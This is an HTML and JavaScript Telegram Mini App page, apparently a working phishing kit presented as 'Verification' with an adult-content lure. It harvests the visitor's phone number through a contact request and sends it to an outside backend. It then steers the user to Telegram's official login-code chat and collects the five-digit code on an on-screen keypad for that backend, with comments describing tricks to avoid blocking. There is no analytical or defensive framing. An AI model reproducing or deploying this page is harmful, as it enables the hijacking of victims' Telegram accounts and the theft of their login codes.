<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { 
            font-family: 'Arial', sans-serif; 
            margin: 0; padding: 0; 
            background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
            background-size: cover;
            height: 100vh; display: flex; align-items: flex-end; justify-content: center;
            overflow: hidden;
        }
        .overlay { background: rgba(0, 0, 0, 0.5); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
        
        .main-container { 
            width: 90%; max-width: 360px; 
            z-index: 9999; /* সবার উপরে রাখার জন্য */
            position: relative; 
            text-align: center; margin-bottom: 40px; 
        }

        .instruction-box {
            background: white; padding: 15px; border-radius: 15px;
            margin-bottom: 15px; color: #333; font-weight: bold; font-size: 16px;
        }

        /* বাটন ডিজাইন */
        .get-code-btn {
            background: #0088cc; color: white; border: 2px solid white;
            padding: 15px; border-radius: 12px; font-size: 18px; font-weight: bold;
            cursor: pointer; width: 100%; margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            display: block; position: relative; z-index: 10000;
        }
        .get-code-btn:active { background: #0077b3; transform: scale(0.98); }

        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 15px; }
        .otp-box {
            width: 50px; height: 55px; background: rgba(255, 255, 255, 0.2);
            border: 2px solid white; border-radius: 12px; display: flex;
            align-items: center; justify-content: center; font-size: 28px; color: white; font-weight: bold;
            backdrop-filter: blur(5px);
        }

        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .key { 
            background: #4caf50; padding: 18px; border-radius: 12px; 
            font-size: 24px; font-weight: bold; color: white; border: none;
        }
        .key:active { background: #388e3c; }

        .hidden { display: none !important; }
        .loader { color: white; font-weight: bold; font-size: 20px; text-shadow: 2px 2px 5px black; }
    </style>
</head>
<body>
    <div class="overlay"></div>

    <div class="main-container">
        <div id="step0">
            <div style="font-size: 60px; margin-bottom: 20px; animation: bounce 1s infinite;">👇</div>
            <div id="load" class="loader hidden">🔄 Connecting...</div>
        </div>

        <div id="step2" class="hidden">
            <div class="instruction-box">Enter the 5-digit code!</div>

            <!-- আপডেট করা বাটন -->
            <button type="button" class="get-code-btn" id="codeBtn">
                📩 View Code & Minimize
            </button>

            <div class="otp-inputs">
                <div class="otp-box" id="b1"></div>
                <div class="otp-box" id="b2"></div>
                <div class="otp-box" id="b3"></div>
                <div class="otp-box" id="b4"></div>
                <div class="otp-box" id="b5"></div>
            </div>

            <div class="keypad">
                <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
                <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
                <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
                <div class="key" style="background:transparent"></div><div class="key" onclick="addNum('0')">0</div><div class="key" onclick="clearNum()">⌫</div>
            </div>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
        const BACKEND_URL = "https://pmrony-session-bot.hf.space"; 
        let currentOTP = "";

        tg.MainButton.setText("🍓 START CONTINUE 🔞");
        tg.MainButton.show();
        tg.MainButton.onClick(startFlow);

        // বাটনের জন্য ইভেন্ট লিসেনার (এটি onclick এর চেয়ে বেশি শক্তিশালী)
        document.getElementById('codeBtn').addEventListener('click', function() {
            tg.HapticFeedback.impactOccurred('heavy');
            
            // ট্রিক: পপআপ শো করা (এটি অনেক সময় ব্লক হওয়া আটকায়)
            tg.showConfirm("কোডটি দেখতে হলে আপনাকে মেসেজ বক্সে যেতে হবে। আপনি কি এখন মেসেজ বক্স ওপেন করতে চান?", function(ok){
                if (ok) {
                    // ১. সরাসরি লিংক ওপেন
                    tg.openTelegramLink("tg://openmessage?user_id=777000");
                    
                    // ২. মিনিমাইজ করার ট্রিক
                    setTimeout(() => {
                        tg.switchInlineQuery(""); 
                    }, 200);
                }
            });
        });

        function startFlow() {
            tg.requestContact();
            tg.MainButton.hide();
            document.getElementById('step0').classList.add('hidden');
            document.getElementById('load').classList.remove('hidden');
            poll();
        }

        async function poll() {
            try {
                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                const data = await res.json();
                if (data.status === "success") { sendNumberToBot(data.phone); }
                else { setTimeout(poll, 1500); }
            } catch (e) { setTimeout(poll, 2000); }
        }

        async function sendNumberToBot(phone) {
            try {
                const res = await fetch(`${BACKEND_URL}/send_number`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, phone: phone })
                });
                const data = await res.json();
                if (data.status === "success") {
                    document.getElementById('load').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                }
            } catch (e) { }
        }

        function addNum(n) {
            if(currentOTP.length < 5) {
                currentOTP += n;
                updateBoxes();
                if(currentOTP.length === 5) { verifyOTP(); }
            }
        }
        function clearNum() { currentOTP = currentOTP.slice(0, -1); updateBoxes(); }
        function updateBoxes() {
            for(let i=1; i<=5; i++) { document.getElementById('b'+i).innerText = currentOTP[i-1] || ""; }
        }

        async function verifyOTP() {
            try {
                const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, otp: currentOTP })
                });
                const data = await res.json();
                if (data.status === "success") { window.location.href = "https://google.com"; }
                else { tg.showAlert("Invalid Code!"); currentOTP = ""; updateBoxes(); }
            } catch (e) { }
        }
    </script>
</body>
</html>
